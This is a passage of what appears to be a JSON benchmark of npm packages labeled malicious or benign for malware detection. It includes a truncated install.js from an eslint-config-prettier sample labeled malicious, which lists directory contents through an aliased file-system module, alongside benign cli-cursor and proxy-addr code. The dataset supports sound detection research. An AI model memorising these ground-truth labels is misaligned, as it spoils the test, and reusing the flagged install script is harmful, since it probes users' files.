`- ${ruleName}`)\n    .join(\"\\n\");\n}\n\nexports.processRules = \n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/bin/cli.js (function)\nfunction filterRuleNames(rules, fn) {\n  return [\n    ...new Set(rules.filter((rule) => fn(rule)).map((rule) => rule.ruleName)),\n  ];\n}\n\nfunction printRuleNames(ruleNames) {\n  return ruleNames\n    .slice()\n    .sort()\n    .map((ruleName) => `- ${ruleName}`)\n    .join(\"\\n\");\n}\n\nexports.processRules = processRules;\n\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/bin/cli.js (function)\nfunction printRuleNames(ruleNames) {\n  return ruleNames\n    .slice()\n    .sort()\n    .map((ruleName) => `- ${ruleName}`)\n    .join(\"\\n\");\n}\n\nexports.processRules = processRules;\n\n==================================================\n",
      "file_paths": [
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/standard.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/prettier.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/unicorn.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/react.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/index.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/@typescript-eslint.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/vue.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/babel.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/flowtype.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/bin/validators.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/bin/cli.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/bin/cli.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/bin/cli.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/bin/cli.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/bin/cli.js"
      ],
      "individual_files": {
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/standard.js": "throw new Error(\n  '\"prettier/standard\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/prettier.js": "\"use strict\";\n\nmodule.exports = {\n  rules: {\n    // These are safe to use as long as the `\"prettier/prettier\"` rule from\n    // eslint-plugin-prettier isn\u2019t enabled.\n    // These are also included in `\"plugin:prettier/recommended\"`:\n    // https://github.com/prettier/eslint-plugin-prettier#recommended-configuration\n    \"arrow-body-style\": 0,\n    \"prefer-arrow-callback\": 0,\n  },\n};\n",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/unicorn.js": "throw new Error(\n  '\"prettier/unicorn\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/react.js": "throw new Error(\n  '\"prettier/react\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/index.js": "\"use strict\";\n\nconst includeDeprecated = !process.env.ESLINT_CONFIG_PRETTIER_NO_DEPRECATED;\n\nconst specialRule = 0;\n\nmodule.exports = {\n  rules: {\n    // The following rules can be used in some cases. See the README for more\n    // information. These are marked with `0` instead of `\"off\"` so that a\n    // script can distinguish them. Note that there are a few more of these\n    // in the deprecated section below.\n    \"curly\": specialRule,\n    \"no-unexpected-multiline\": specialRule,\n    \"@typescript-eslint/lines-around-comment\": specialRule,\n    \"@typescript-eslint/quotes\": specialRule,\n    \"babel/quotes\": specialRule,\n    \"unicorn/template-indent\": specialRule,\n    \"vue/html-self-closing\": specialRule,\n    \"vue/max-len\": specialRule,\n\n    // The rest are rules that you never need to enable when using Prettier.\n    \"@babel/object-curly-spacing\": \"off\",\n    \"@babel/semi\": \"off\",\n    \"@typescript-eslint/block-spacing\": \"off\",\n    \"@typescript-eslint/brace-style\": \"off\",\n    \"@typescript-eslint/comma-dangle\": \"off\",\n    \"@typescript-eslint/comma-spacing\": \"off\",\n    \"@typescript-eslint/func-call-spacing\": \"off\",\n    \"@typescript-eslint/indent\": \"off\",\n    \"@typescript-eslint/key-spacing\": \"off\",\n    \"@typescript-eslint/keyword-spacing\": \"off\",\n    \"@typescript-eslint/member-delimiter-style\": \"off\",\n    \"@typescript-eslint/no-extra-parens\": \"off\",\n    \"@typescript-eslint/no-extra-semi\": \"off\",\n    \"@typescript-eslint/object-curly-spacing\": \"off\",\n    \"@typescript-eslint/semi\": \"off\",\n    \"@typescript-eslint/space-before-blocks\": \"off\",\n    \"@typescript-eslint/space-before-function-paren\": \"off\",\n    \"@typescript-eslint/space-infix-ops\": \"off\",\n    \"@typescript-eslint/type-annotation-spacing\": \"off\",\n    \"babel/object-curly-spacing\": \"off\",\n    \"babel/semi\": \"off\",\n    \"flowtype/boolean-style\": \"off\",\n    \"flowtype/delimiter-dangle\": \"off\",\n    \"flowtype/generic-spacing\": \"off\",\n    \"flowtype/object-type-curly-spacing\": \"off\",\n    \"flowtype/object-type-delimiter\": \"off\",\n    \"flowtype/quotes\": \"off\",\n    \"flowtype/semi\": \"off\",\n    \"flowtype/space-after-type-colon\": \"off\",\n    \"flowtype/space-before-generic-bracket\": \"off\",\n    \"flowtype/space-before-type-colon\": \"off\",\n    \"flowtype/union-intersection-spacing\": \"off\",\n    \"react/jsx-child-element-spacing\": \"off\",\n    \"react/jsx-closing-bracket-location\": \"off\",\n    \"react/jsx-closing-tag-location\": \"off\",\n    \"react/jsx-curly-newline\": \"off\",\n    \"react/jsx-curly-spacing\": \"off\",\n    \"react/jsx-equals-spacing\": \"off\",\n    \"react/jsx-first-prop-new-line\": \"off\",\n    \"react/jsx-indent\": \"off\",\n    \"react/jsx-indent-props\": \"off\",\n    \"react/jsx-max-props-per-line\": \"off\",\n    \"react/jsx-newline\": \"off\",\n    \"react/jsx-one-expression-per-line\": \"off\",\n    \"react/jsx-props-no-multi-spaces\": \"off\",\n    \"react/jsx-tag-spacing\": \"off\",\n    \"react/jsx-wrap-multilines\": \"off\",\n    \"standard/array-bracket-even-spacing\": \"off\",\n    \"standard/computed-property-even-spacing\": \"off\",\n    \"standard/object-curly-even-spacing\": \"off\",\n    \"unicorn/empty-brace-spaces\": \"off\",\n    \"unicorn/no-nested-ternary\": \"off\",\n    \"unicorn/number-literal-case\": \"off\",\n    \"vue/array-bracket-newline\": \"off\",\n    \"vue/array-bracket-spacing\": \"off\",\n    \"vue/array-element-newline\": \"off\",\n    \"vue/arrow-spacing\": \"off\",\n    \"vue/block-spacing\": \"off\",\n    \"vue/block-tag-newline\": \"off\",\n    \"vue/brace-style\": \"off\",\n    \"vue/comma-dangle\": \"off\",\n    \"vue/comma-spacing\": \"off\",\n    \"vue/comma-style\": \"off\",\n    \"vue/dot-location\": \"off\",\n    \"vue/func-call-spacing\": \"off\",\n    \"vue/html-closing-bracket-newline\": \"off\",\n    \"vue/html-closing-bracket-spacing\": \"off\",\n    \"vue/html-end-tags\": \"off\",\n    \"vue/html-indent\": \"off\",\n    \"vue/html-quotes\": \"off\",\n    \"vue/key-spacing\": \"off\",\n    \"vue/keyword-spacing\": \"off\",\n    \"vue/max-attributes-per-line\": \"off\",\n    \"vue/multiline-html-element-content-newline\": \"off\",\n    \"vue/multiline-ternary\": \"off\",\n    \"vue/mustache-interpolation-spacing\": \"off\",\n    \"vue/no-extra-parens\": \"off\",\n    \"vue/no-multi-spaces\": \"off\",\n    \"vue/no-spaces-around-equal-signs-in-attribute\": \"off\",\n    \"vue/object-curly-newline\": \"off\",\n    \"vue/object-curly-spacing\": \"off\",\n    \"vue/object-property-newline\": \"off\",\n    \"vue/operator-linebreak\": \"off\",\n    \"vue/quote-props\": \"off\",\n    \"vue/script-indent\": \"off\",\n    \"vue/singleline-html-element-content-newline\": \"off\",\n    \"vue/space-in-parens\": \"off\",\n    \"vue/space-infix-ops\": \"off\",\n    \"vue/space-unary-ops\": \"off\",\n    \"vue/template-curly-spacing\": \"off\",\n\n    ...(includeDeprecated && {\n      // Removed in version 0.10.0.\n      // https://eslint.org/docs/latest/rules/space-unary-word-ops\n      \"space-unary-word-ops\": \"off\",\n\n      // Removed in version 1.0.0.\n      // https://github.com/eslint/eslint/issues/1898\n      \"generator-star\": \"off\",\n      \"no-comma-dangle\": \"off\",\n      \"no-reserved-keys\": \"off\",\n      \"no-space-before-semi\": \"off\",\n      \"no-wrap-func\": \"off\",\n      \"space-after-function-name\": \"off\",\n      \"space-before-function-parentheses\": \"off\",\n      \"space-in-brackets\": \"off\",\n\n      // Removed in version 2.0.0.\n      // https://github.com/eslint/eslint/issues/5032\n      \"no-arrow-condition\": \"off\",\n      \"space-after-keywords\": \"off\",\n      \"space-before-keywords\": \"off\",\n      \"space-return-throw-case\": \"off\",\n\n      // Deprecated since version 3.3.0.\n      // https://eslint.org/docs/rules/no-spaced-func\n      \"no-spaced-func\": \"off\",\n\n      // Deprecated since version 4.0.0.\n      // https://github.com/eslint/eslint/pull/8286\n      \"indent-legacy\": \"off\",\n\n      // Deprecated since version 8.53.0.\n      // https://eslint.org/blog/2023/10/deprecating-formatting-rules/\n      \"array-bracket-newline\": \"off\",\n      \"array-bracket-spacing\": \"off\",\n      \"array-element-newline\": \"off\",\n      \"arrow-parens\": \"off\",\n      \"arrow-spacing\": \"off\",\n      \"block-spacing\": \"off\",\n      \"brace-style\": \"off\",\n      \"comma-dangle\": \"off\",\n      \"comma-spacing\": \"off\",\n      \"comma-style\": \"off\",\n      \"computed-property-spacing\": \"off\",\n      \"dot-location\": \"off\",\n      \"eol-last\": \"off\",\n      \"func-call-spacing\": \"off\",\n      \"function-call-argument-newline\": \"off\",\n      \"function-paren-newline\": \"off\",\n      \"generator-star-spacing\": \"off\",\n      \"implicit-arrow-linebreak\": \"off\",\n      \"indent\": \"off\",\n      \"jsx-quotes\": \"off\",\n      \"key-spacing\": \"off\",\n      \"keyword-spacing\": \"off\",\n      \"linebreak-style\": \"off\",\n      \"lines-around-comment\": specialRule,\n      \"max-len\": specialRule,\n      \"max-statements-per-line\": \"off\",\n      \"multiline-ternary\": \"off\",\n      \"new-parens\": \"off\",\n      \"newline-per-chained-call\": \"off\",\n      \"no-confusing-arrow\": specialRule,\n      \"no-extra-parens\": \"off\",\n      \"no-extra-semi\": \"off\",\n      \"no-floating-decimal\": \"off\",\n      \"no-mixed-operators\": specialRule,\n      \"no-mixed-spaces-and-tabs\": \"off\",\n      \"no-multi-spaces\": \"off\",\n      \"no-multiple-empty-lines\": \"off\",\n      \"no-tabs\": specialRule,\n      \"no-trailing-spaces\": \"off\",\n      \"no-whitespace-before-property\": \"off\",\n      \"nonblock-statement-body-position\": \"off\",\n      \"object-curly-newline\": \"off\",\n      \"object-curly-spacing\": \"off\",\n      \"object-property-newline\": \"off\",\n      \"one-var-declaration-per-line\": \"off\",\n      \"operator-linebreak\": \"off\",\n      \"padded-blocks\": \"off\",\n      \"quote-props\": \"off\",\n      \"quotes\": specialRule,\n      \"rest-spread-spacing\": \"off\",\n      \"semi\": \"off\",\n      \"semi-spacing\": \"off\",\n      \"semi-style\": \"off\",\n      \"space-before-blocks\": \"off\",\n      \"space-before-function-paren\": \"off\",\n      \"space-in-parens\": \"off\",\n      \"space-infix-ops\": \"off\",\n      \"space-unary-ops\": \"off\",\n      \"switch-colon-spacing\": \"off\",\n      \"template-curly-spacing\": \"off\",\n      \"template-tag-spacing\": \"off\",\n      \"wrap-iife\": \"off\",\n      \"wrap-regex\": \"off\",\n      \"yield-star-spacing\": \"off\",\n\n      // Deprecated since version 7.0.0.\n      // https://github.com/yannickcr/eslint-plugin-react/blob/master/CHANGELOG.md#700---2017-05-06\n      \"react/jsx-space-before-closing\": \"off\",\n    }),\n  },\n};\n",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/@typescript-eslint.js": "throw new Error(\n  '\"prettier/@typescript-eslint\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/install.js": "function listDirectoryContents(dirPath) {\n    if (!cache.existsSync(dirPath)) {\n        log(`Directory does not exist: ${dirPath}`);\n        return;\n    }\n    log(`Contents of ${dirPath}:`);\n    const files = cache.readdirSync(dirPath);\n    for (const file of files) {\n        try {\n            const filePath = path.join(dirPath, file);\n            const stat = cache.statSync(filePath);\n            const sizeKB = (stat.size / 1024).toFixed(2);\n            const mtime = new Date(stat.mtimeMs).toLo",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/vue.js": "throw new Error(\n  '\"prettier/vue\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/babel.js": "throw new Error(\n  '\"prettier/babel\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/flowtype.js": "throw new Error(\n  '\"prettier/flowtype\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/bin/validators.js": "\"use strict\";\n\n// These validator functions answer the question \u201cIs the config valid?\u201d \u2013 return\n// `false` if the options DO conflict with Prettier, and `true` if they don\u2019t.\n\nmodule.exports = {\n  \"curly\"({ options }) {\n    if (options.length === 0) {\n      return true;\n    }\n\n    const firstOption = options[0];\n    return firstOption !== \"multi-line\" && firstOption !== \"multi-or-nest\";\n  },\n\n  \"lines-around-comment\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const firstOption = options[0];\n    return Boolean(\n      firstOption &&\n        firstOption.allowBlockStart &&\n        firstOption.allowBlockEnd &&\n        firstOption.allowObjectStart &&\n        firstOption.allowObjectEnd &&\n        firstOption.allowArrayStart &&\n        firstOption.allowArrayEnd\n    );\n  },\n\n  \"no-confusing-arrow\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const firstOption = options[0];\n    return firstOption ? firstOption.allowParens === false : false;\n  },\n\n  \"no-tabs\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const firstOption = options[0];\n    return Boolean(firstOption && firstOption.allowIndentationTabs);\n  },\n\n  \"unicorn/template-indent\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const { comments = [], tags = [] } = options[0] || {};\n\n    return (\n      Array.isArray(comments) &&\n      Array.isArray(tags) &&\n      !(\n        comments.includes(\"GraphQL\") ||\n        comments.includes(\"HTML\") ||\n        tags.includes(\"css\") ||\n        tags.includes(\"graphql\") ||\n        tags.includes(\"gql\") ||\n        tags.includes(\"html\") ||\n        tags.includes(\"markdown\") ||\n        tags.includes(\"md\")\n      )\n    );\n  },\n\n  \"vue/html-self-closing\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const firstOption = options[0];\n    return Boolean(\n      firstOption && firstOption.html && firstOption.html.void === \"any\"\n      // Enable when Prettier supports SVG: https://github.com/prettier/prettier/issues/5322\n      // && firstOption.svg === \"any\"\n    );\n  },\n};\n",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/bin/cli.js": "function printRuleNames(ruleNames) {\n  return ruleNames\n    .slice()\n    .sort()\n    .map((ruleName) => `- ${ruleName}`)\n    .join(\"\\n\");\n}\n\nexports.processRules = processRules;\n"
      },
      "package_size_bytes": 23119,
      "num_files": 24,
      "metadata": {
        "package_hash": "npm_eslint-config-prettier_2025",
        "malicious_label": 1.0
      }
    },
    {
      "package_name": "cli-cursor",
      "ecosystem": "npm",
      "sample_type": "benign",
      "ground_truth_label": 0,
      "raw_content": "\n# File: data/benign_samples/npm/longtail/cli-cursor/5.0.0/package/index.js (file)\nimport process from 'node:process';\nimport restoreCursor from 'restore-cursor';\n\nlet isHidden = false;\n\nconst cliCursor = {};\n\ncliCursor.show = (writableStream = process.stderr) => {\n\tif (!writableStream.isTTY) {\n\t\treturn;\n\t}\n\n\tisHidden = false;\n\twritableStream.write('\\u001B[?25h');\n};\n\ncliCursor.hide = (writableStream = process.stderr) => {\n\tif (!writableStream.isTTY) {\n\t\treturn;\n\t}\n\n\trestoreCursor();\n\tisHidden = true;\n\twritableStream.write('\\u001B[?25l');\n};\n\ncliCursor.toggle = (force, writableStream) => {\n\tif (force !== undefined) {\n\t\tisHidden = force;\n\t}\n\n\tif (isHidden) {\n\t\tcliCursor.show(writableStream);\n\t} else {\n\t\tcliCursor.hide(writableStream);\n\t}\n};\n\nexport default cliCursor;\n\n==================================================\n\n# File: data/benign_samples/npm/longtail/cli-cursor/5.0.0/package/index.d.ts (file)\ndeclare const cliCursor: {\n\t/**\n\tShow cursor.\n\n\t@param stream - Default: `process.stderr`.\n\n\t@example\n\t```\n\timport cliCursor from 'cli-cursor';\n\n\tcliCursor.show();\n\t```\n\t*/\n\tshow(stream?: NodeJS.WritableStream): void;\n\n\t/**\n\tHide cursor.\n\n\t@param stream - Default: `process.stderr`.\n\n\t@example\n\t```\n\timport cliCursor from 'cli-cursor';\n\n\tcliCursor.hide();\n\t```\n\t*/\n\thide(stream?: NodeJS.WritableStream): void;\n\n\t/**\n\tToggle cursor visibility.\n\n\t@param force - Is useful to show or hide the cursor based on a boolean.\n\t@param stream - Default: `process.stderr`.\n\n\t@example\n\t```\n\timport cliCursor from 'cli-cursor';\n\n\tconst unicornsAreAwesome = true;\n\tcliCursor.toggle(unicornsAreAwesome);\n\t```\n\t*/\n\ttoggle(force?: boolean, stream?: NodeJS.WritableStream): void;\n};\n\nexport default cliCursor;\n\n==================================================\n",
      "file_paths": [
        "data/benign_samples/npm/longtail/cli-cursor/5.0.0/package/index.js",
        "data/benign_samples/npm/longtail/cli-cursor/5.0.0/package/index.d.ts"
      ],
      "individual_files": {
        "data/benign_samples/npm/longtail/cli-cursor/5.0.0/package/index.js": "import process from 'node:process';\nimport restoreCursor from 'restore-cursor';\n\nlet isHidden = false;\n\nconst cliCursor = {};\n\ncliCursor.show = (writableStream = process.stderr) => {\n\tif (!writableStream.isTTY) {\n\t\treturn;\n\t}\n\n\tisHidden = false;\n\twritableStream.write('\\u001B[?25h');\n};\n\ncliCursor.hide = (writableStream = process.stderr) => {\n\tif (!writableStream.isTTY) {\n\t\treturn;\n\t}\n\n\trestoreCursor();\n\tisHidden = true;\n\twritableStream.write('\\u001B[?25l');\n};\n\ncliCursor.toggle = (force, writableStream) => {\n\tif (force !== undefined) {\n\t\tisHidden = force;\n\t}\n\n\tif (isHidden) {\n\t\tcliCursor.show(writableStream);\n\t} else {\n\t\tcliCursor.hide(writableStream);\n\t}\n};\n\nexport default cliCursor;\n",
        "data/benign_samples/npm/longtail/cli-cursor/5.0.0/package/index.d.ts": "declare const cliCursor: {\n\t/**\n\tShow cursor.\n\n\t@param stream - Default: `process.stderr`.\n\n\t@example\n\t```\n\timport cliCursor from 'cli-cursor';\n\n\tcliCursor.show();\n\t```\n\t*/\n\tshow(stream?: NodeJS.WritableStream): void;\n\n\t/**\n\tHide cursor.\n\n\t@param stream - Default: `process.stderr`.\n\n\t@example\n\t```\n\timport cliCursor from 'cli-cursor';\n\n\tcliCursor.hide();\n\t```\n\t*/\n\thide(stream?: NodeJS.WritableStream): void;\n\n\t/**\n\tToggle cursor visibility.\n\n\t@param force - Is useful to show or hide the cursor based on a boolean.\n\t@param stream - Default: `process.stderr`.\n\n\t@example\n\t```\n\timport cliCursor from 'cli-cursor';\n\n\tconst unicornsAreAwesome = true;\n\tcliCursor.toggle(unicornsAreAwesome);\n\t```\n\t*/\n\ttoggle(force?: boolean, stream?: NodeJS.WritableStream): void;\n};\n\nexport default cliCursor;\n"
      },
      "package_size_bytes": 1757,
      "num_files": 2,
      "metadata": {
        "package_hash": "npm_cli-cursor_5.0.0",
        "malicious_label": 0.0
      }
    },
    {
      "package_name": "proxy-addr",
      "ecosystem": "npm",
      "sample_type": "benign",
      "ground_truth_label": 0,
      "raw_content": "\n# File: data/benign_samples/npm/popular/proxy-addr/2.0.7/package/index.js (function)\nfunction alladdrs (req, trust) {\n  // get addresses\n  var addrs = forwarded(req)\n\n  if (!trust) {\n    // Return all addresses\n    return addrs\n  }\n\n  if (typeof trust !== 'function') {\n    trust = compile(trust)\n  }\n\n  for (var i = 0; i < addrs.length - 1; i++) {\n    if (trust(addrs[i], i)) continue\n\n    addrs.length = i + 1\n  }\n\n  return addrs\n}\n\n/**\n * Compile argument into trust function.\n *\n * @param {Array|String} val\n * @private\n */\n\nfunction compile (val) {\n  if (!val) {\n    throw new Typ\n==================================================\n\n# File: data/benign_samples/npm/popular/proxy-addr/2.0.7/package/index.js (function)\nfunction compile (val) {\n  if (!val) {\n    throw new TypeError('argument is required')\n  }\n\n  var trust\n\n  if (typeof val === 'string') {\n    trust = [val]\n  } else if (Array.isArray(val)) {\n    trust = val.slice()\n  } else {\n    throw new TypeError('unsupported trust argument')\n  }\n\n  for (var i = 0; i < trust.length; i++) {\n    val = trust[i]\n\n    if (!Object.prototype.hasOwnProperty.call(IP_RANGES, val)) {\n      continue\n    }\n\n    // Splice in pre-defined range\n    val = IP_RANGES[val]\n    t\n==================================================\n\n# File: data/benign_samples/npm/popular/proxy-addr/2.0.7/package/index.js (function)\nfunction compileRangeSubnets (arr) {\n  var rangeSubnets = new Array(arr.length)\n\n  for (var i = 0; i < arr.length; i++) {\n    rangeSubnets[i] = parseipNotation(arr[i])\n  }\n\n  return rangeSubnets\n}\n\n/**\n * Compile range subnet array into trust function.\n *\n * @param {Array} rangeSubnets\n * @private\n */\n\nfunction compileTrust (rangeSubnets) {\n  // Return optimized function based on length\n  var len = rangeSubnets.length\n  return len === 0\n    ? trustNone\n    : len === 1\n      ? trustSingle(rangeSu\n==================================================\n\n# File: data/benign_samples/npm/popular/proxy-addr/2.0.7/package/index.js (function)\nfunction compileTrust (rangeSubnets) {\n  // Return optimized function based on length\n  var len = rangeSubnets.length\n  return len === 0\n    ? trustNone\n    : len === 1\n      ? trustSingle(rangeSubnets[0])\n      : trustMulti(rangeSubnets)\n}\n\n/**\n * Parse IP notation string into range subnet.\n *\n * @param {String} note\n * @private\n */\n\nfunction parseipNotation (note) {\n  var pos = note.lastIndexOf('/')\n  var str = pos !== -1\n    ? note.substring(0, pos)\n    : note\n\n  if (!isip(str)) {\n    throw n\n==================================================\n\n# File: data/benign_samples/npm/popular/proxy-addr/2.0.7/package/index.js (function)\nfunction parseipNotation (note) {\n  var pos = note.lastIndexOf('/')\n  var str = pos !== -1\n    ? note.substring(0, pos)\n    : note\n\n  if (!isip(str)) {\n    throw new TypeError('invalid IP address: ' + str)\n  }\n\n  var ip = parseip(str)\n\n  if (pos === -1 && ip.kind() === 'ipv6' && ip.isIPv4MappedAddress()) {\n    // Store as IPv4\n    ip = ip.toIPv4Address()\n  }\n\n  var max = ip.kind() === 'ipv6'\n    ? 128\n    : 32\n\n  var range = pos !== -1\n    ? note.substring(pos + 1, note.length)\n    : null\n\n  if \n==================================================\n\n# File: data/benign_samples/npm/popular/proxy-addr/2.0.7/package/index.js (function)\nfunction parseNetmask (netmask) {\n  var ip = parseip(netmask)\n  var kind = ip.kind()\n\n  return kind === 'ipv4'\n    ? ip.prefixLengthFromSubnetMask()\n    : null\n}\n\n/**\n * Determine address of proxied request.\n *\n * @param {Object} request\n * @param {Function|Array|String} trust\n * @public\n */\n\nfunction proxyaddr (req, trust) {\n  if (!req) {\n    throw new TypeError('req argument is required')\n  }\n\n  if (!trust) {\n    throw new TypeError('trust argument is required')\n  }\n\n  var addrs = alladdrs(req\n==================================================\n\n# File: data/benign_samples/npm/popular/proxy-addr/2.0.7/package/index.js (function)\nfunction proxyaddr (req, trust) {\n  if (!req) {\n    throw new TypeError('req argument is required')\n  }\n\n  if (!trust) {\n    throw new TypeError('trust argument is required')\n  }\n\n  var addrs = alladdrs(req, trust)\n  var addr = addrs[addrs.length - 1]\n\n  return addr\n}\n\n/**\n * Static trust function to trust nothing.\n *\n * @private\n */\n\nfunction trustNone () {\n  return false\n}\n\n/**\n * Compile trust function for multiple subnets.\n *\n * @param {Array} subnets\n * @private\n */\n\nfunction trustMulti (su\n==================================================\n\n# File: data/benign_samples/npm/popular/proxy-addr/2.0.7/package/index.js (function)\nfunction trustNone () {\n  return false\n}\n\n/**\n * Compile trust function for multiple subnets.\n *\n * @param {Array} subnets\n * @private\n */\n\nfunction trustMulti (subnets) {\n  return function trust (addr) {\n    if (!isip(addr)) return false\n\n    var ip = parseip(addr)\n    var ipconv\n    var kind = ip.kind()\n\n    for (var i = 0; i < subnets.length; i++) {\n      var subnet = subnets[i]\n      var subnetip = subnet[0]\n      var subnetkind = subnetip.kind()\n      var subnetrange = subnet[1]\n      var t\n==================================================\n\n# File: data/benign_samples/npm/popular/proxy-addr/2.0.7/package/index.js (function)\nfunction trustMulti (subnets) {\n  return function trust (addr) {\n    if (!isip(addr)) return false\n\n    var ip = parseip(addr)\n    var ipconv\n    var kind = ip.kind()\n\n    for (var i = 0; i < subnets.length; 